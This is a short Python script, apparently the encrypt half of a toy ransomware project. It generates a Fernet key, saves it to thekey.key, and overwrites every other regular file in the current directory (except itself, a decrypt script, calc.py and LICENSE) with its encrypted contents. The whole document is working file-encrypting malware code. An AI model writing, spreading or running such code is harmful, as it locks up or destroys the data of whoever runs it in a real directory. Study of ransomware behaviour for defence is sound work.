import os 
from cryptography.fernet import Fernet

files=[]
for file in os.listdir():
    if file == "mal_encrypt.py" or file == "mal_decrypt.py" or file == "thekey.key" or file == "calc.py" or file == "LICENSE":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key=Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted_contents)